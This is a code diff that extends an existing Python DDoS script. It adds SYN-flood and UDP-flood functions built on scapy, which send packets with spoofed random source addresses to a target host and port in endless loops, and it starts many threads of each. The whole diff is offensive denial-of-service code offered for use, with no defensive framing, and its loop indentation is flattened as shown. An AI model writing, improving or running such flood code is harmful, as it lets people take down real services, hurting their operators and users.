@@ -24,6 +24,7 @@
  import sys
  import requests
  import socks  # Import the PySocks library
+ from scapy.all import * #Network Scanning Tools for DOS and DDOS attacks
  
 
  # Configuration
@@ -132,6 +133,49 @@
  logging.info(f"\033[32mStarting DDoS attack on {TARGET}:{PORT} with {THREADS} threads...\033[0m")  # Dark Green
  
 
+ # Function to perform SYN flood attack
+ def syn_flood(target_ip, target_port):
+  while True:
+  # Craft a SYN packet
+  ip = IP(src=generate_random_ip(), dst=target_ip)
+  syn = TCP(sport=RandShort(), dport=target_port, flags='S')
+  raw = Raw(b"X" * 1024)
+  p = ip / syn / raw
+ 
+
+  # Send the packet
+  send(p, verbose=0)
+ 
+
+ def udp_flood(target_ip, target_port):
+  while True:
+  # Craft a UDP packet
+  ip = IP(src=generate_random_ip(), dst=target_ip)
+  udp = UDP(sport=RandShort(), dport=target_port)
+  raw = Raw(b"X" * 1024)
+  p = ip / udp / raw
+ 
+
+  # Send the packet
+  send(p, verbose=0)
+ 
+
+ # Start SYN flood threads
+ for _ in range(THREADS):
+  t = threading.Thread(target=syn_flood, args=(TARGET, PORT))
+  t.daemon = True
+  threads.append(t)
+  t.start()
+ 
+
+ 
+
+ # Start UDP flood threads
+ for _ in range(THREADS):
+  t = threading.Thread(target=udp_flood, args=(TARGET, PORT))
+  t.daemon = True
+  threads.append(t)
+  t.start()
  
 
  # Additional methods to increase attack efficiency
